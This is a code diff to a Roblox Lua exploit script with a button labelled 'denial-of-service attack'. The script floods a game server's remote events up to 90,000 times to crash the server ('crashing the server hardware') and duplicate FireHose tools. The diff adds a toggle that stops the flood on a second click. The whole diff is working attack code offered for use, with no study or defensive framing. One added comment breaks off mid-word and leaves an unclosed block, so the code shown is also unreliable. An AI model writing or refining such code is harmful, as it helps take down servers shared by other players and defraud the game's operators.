@@ -29,7 +29,20 @@ Tab:Button({
    Title = "denial-of-service attack",
    Desc = "target: server",
    Callback = function()
-local player = game:GetService("Players").LocalPlayer
+        -- Se já estiver rodando, o segundo clique desliga tudo imediatamente
+        if _G.DupeAtivo then
+            _G.DupeAtivo = false
+            if _G.DupeThread then
+                pcall(function()
+                    task.cancel(_G.DupeThread)
+                end)
+                _G.DupeThread = nil
+            end
+            
+            -- Avisa que foi cancelado (Opcional: se quiser remover esta notificação, basta apagar o bloco abaix
+
+        -- Inicia o processo de duplicação
+        local player = game:GetService("Players").LocalPlayer
         if not player then return end
         local replicatedStorage = game:GetService("ReplicatedStorage")
 
@@ -42,63 +55,88 @@ local player = game:GetService("Players").LocalPlayer
         local toolRemote = re and re:FindFirstChild("1Too1l")
         if not toolRemote then return end
 
-        -- Notificação inicial de encerramento solicitada
+        -- Notificação de início
         WindUI:Notify({ 
             Title = "C.I", 
-            Content = "travando hardware do servidor...", 
+            Content = "crashing the server hardware...", 
             Duration = 5 
         })
 
-        task.spawn(function()
+        local isRemoteFunction = toolRemote:IsA("RemoteFunction")
+        _G.DupeAtivo = true
+
+        -- Armazena a thread para permitir o cancelamento no segundo clique
+        _G.DupeThread = task.spawn(function()
             for m = 1, 90000 do
-                task.spawn(function()
-                    if toolRemote:IsA("RemoteFunction") then
-                        toolRemote:InvokeServer("PickingTools", "FireHose")
-                    else
-                        toolRemote:FireServer("PickingTools", "FireHose")
-                    end
-                end)
+                -- Garante que o loop pare se o estado mudar para falso
+                if not _G.DupeAtivo then break end
+
+                if isRemoteFunction then
+                    task.spawn(function()
+                        pcall(function() toolRemote:InvokeServer("PickingTools", "FireHose") end)
+                    end)
+                else
+                    toolRemote:FireServer("PickingTools", "FireHose")
+                end
 
                 local backpack = player:FindFirstChild("Backpack")
                 if backpack then
                     local fireHose = backpack:FindFirstChild("FireHose")
-                    if fireHose and fireHose:FindFirstChild("ToolSound") then
-                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                    if fireHose then
+                        local toolSound = fireHose:FindFirstChild("ToolSound")
+                        if toolSound then
+                            toolSound:FireServer("FireHose", "DestroyFireHose")
+                        end
                     end
                 end
-                if m % 15 == 0 then task.wait(0.1) end
-            end
-        end)
-
-        task.wait(0.4)
-        player.CharacterRemoving:Wait()
-        local newCharacter = player.CharacterAdded:Wait()
-        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
-        local humanoid = newCharacter:WaitForChild("Humanoid", 15)
-
-        if newRootPart and humanoid then
-            task.wait(0.7)
-            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-            newRootPart.CFrame = oldcf
-            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-        end
-
-        task.wait(0.5)
-
-        local backpack = player:WaitForChild("Backpack", 10)
-        if backpack then
-            local items = backpack:GetChildren()
-            local equipCount = 0
-            for i = 1, #items do
-                local item = items[i]
-                if item:IsA("Tool") and item.Name == "FireHose" then
-                    equipCount = equipCount + 1
-                    task.defer(function() item.Parent = newCharacter end)
-                    if equipCount % 8 == 0 then task.wait(0.02) end 
+                
+                if m % 10 == 0 then 
+                    task.wait() 
                 end
             end
-        end
-        task.wait(0.5)
+            _G.DupeAtivo = false
+            _G.DupeThread = nil
+        end)
+
+        -- Continuação da lógica de respawn controlada pelo estado ativo
+        task.spawn(function()
+            task.wait(0.4)
+            if not _G.DupeAtivo then return end
+            
+            player.CharacterRemoving:Wait()
+            if not _G.DupeAtivo then return end
+            
+            local newCharacter = player.CharacterAdded:Wait()
+            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+            local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+            if newRootPart and humanoid and _G.DupeAtivo then
+                task.wait(0.7)
+                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+                newRootPart.CFrame = oldcf
+                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end
+
+            task.wait(0.5)
+            if not _G.DupeAtivo then return end
+
+            local backpack = player:WaitForChild("Backpack", 10)
+            if backpack then
+                local items = backpack:GetChildren()
+                local equipCount = 0
+                for i = 1, #items do
+                    if not _G.DupeAtivo then break end
+                    local item = items[i]
+                    if item:IsA("Tool") and item.Name == "FireHose" then
+                        equipCount = equipCount + 1
+                        task.defer(function() item.Parent = newCharacter end)
+                        if equipCount % 12 == 0 then 
+                            task.wait() 
+                        end 
+                    end
+                end
+            end
+        end)
     end
 })
 
